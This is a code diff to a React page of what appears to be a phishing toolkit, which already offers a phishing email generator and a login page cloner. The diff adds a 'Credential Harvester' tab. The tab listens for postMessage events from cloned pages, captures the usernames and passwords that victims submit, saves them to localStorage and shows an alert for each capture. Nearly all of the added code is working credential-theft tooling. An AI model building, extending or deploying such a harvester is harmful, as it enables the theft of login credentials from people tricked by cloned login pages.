@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { z } from 'zod';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
@@ -14,6 +14,7 @@ import { cloneLoginPage, type PageClonerInput, type PageClonerOutput } from '@/a
 import { Loader2, AlertTriangle, Mail, Download, Link as LinkIcon } from 'lucide-react';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import { useToast } from '@/hooks/use-toast';
+import { CredentialHarvester, type CapturedCredential } from '@/components/credential-harvester';
 
 const emailSchema = z.object({
   company: z.string().min(2, { message: 'Company name is required.' }),
@@ -37,6 +38,56 @@ export default function PhishingPage() {
   const [clonerResult, setClonerResult] = useState<PageClonerOutput | null>(null);
   const [isClonerLoading, setIsClonerLoading] = useState(false);
   const [clonerError, setClonerError] = useState<string | null>(null);
+
+  // Credential Harvester State
+  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
+
+  useEffect(() => {
+    // Load credentials from localStorage on mount
+    try {
+        const storedCreds = localStorage.getItem('netra-credentials');
+        if (storedCreds) {
+            setCapturedCredentials(JSON.parse(storedCreds));
+        }
+    } catch (error) {
+        console.error('Failed to load credentials from localStorage', error);
+    }
+
+    // Set up postMessage listener
+    const handleMessage = (event: MessageEvent) => {
+        if (event.data && event.data.type === 'credential-capture') {
+            const { username, password } = event.data;
+            const newCredential: CapturedCredential = {
+                username,
+                password,
+                timestamp: Date.now(),
+            };
+            
+            setCapturedCredentials(prevCreds => {
+                const updatedCreds = [...prevCreds, newCredential];
+                localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
+                return updatedCreds;
+            });
+
+            toast({
+                variant: "destructive",
+                title: "Credentials Captured!",
+                description: `Username: ${username}`,
+            });
+        }
+    };
+
+    window.addEventListener('message', handleMessage);
+
+    return () => {
+        window.removeEventListener('message', handleMessage);
+    };
+  }, [toast]);
+
+  const handleClearCredentials = () => {
+    setCapturedCredentials([]);
+    localStorage.removeItem('netra-credentials');
+  };
 
   const emailForm = useForm<z.infer<typeof emailSchema>>({
     resolver: zodResolver(emailSchema),
@@ -108,9 +159,13 @@ export default function PhishingPage() {
         <p className="text-muted-foreground">Craft custom emails and clone login pages.</p>
       </div>
       <Tabs defaultValue="email-generator" className="w-full">
-        <TabsList className="grid w-full grid-cols-2">
+        <TabsList className="grid w-full grid-cols-3">
           <TabsTrigger value="email-generator">Email Generator</TabsTrigger>
           <TabsTrigger value="page-cloner">Login Page Cloner</TabsTrigger>
+          <TabsTrigger value="harvester">
+            Credential Harvester
+            {capturedCredentials.length > 0 && <span className="ml-2 flex h-5 w-5 items-center justify-center rounded-full bg-destructive text-destructive-foreground text-xs">{capturedCredentials.length}</span>}
+          </TabsTrigger>
         </TabsList>
         <TabsContent value="email-generator">
           <div className="grid lg:grid-cols-5 gap-6 mt-4">
@@ -189,6 +244,11 @@ export default function PhishingPage() {
               </Card>
             </div>
           </div>
+        </TabsContent>
+        <TabsContent value="harvester">
+            <div className="mt-4">
+                <CredentialHarvester credentials={capturedCredentials} onClear={handleClearCredentials} />
+            </div>
         </TabsContent>
       </Tabs>
     </div>
